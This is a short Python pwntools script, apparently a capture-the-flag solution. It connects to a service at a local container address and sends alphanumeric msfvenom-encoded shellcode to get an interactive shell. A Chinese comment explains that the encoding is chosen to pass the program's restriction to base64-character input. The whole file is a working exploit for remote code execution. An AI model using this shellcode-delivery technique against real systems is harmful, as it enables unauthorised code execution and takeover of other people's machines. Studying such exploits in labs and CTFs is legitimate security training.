#!/usr/bin/python
#coding:utf-8

from pwn import *
from base64 import *

context.update(arch = 'i386', os = 'linux', timeout = 1)	

io = remote('172.17.0.2', 10001)	

shellcode = b64decode("PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA")
#使用msfvenom编码为全大小写字符的shellcode，以满足程序只能执行base64字符串形式shellcode的限制

print io.recv()
io.send(shellcode)	
print io.recv()		
io.interactive()
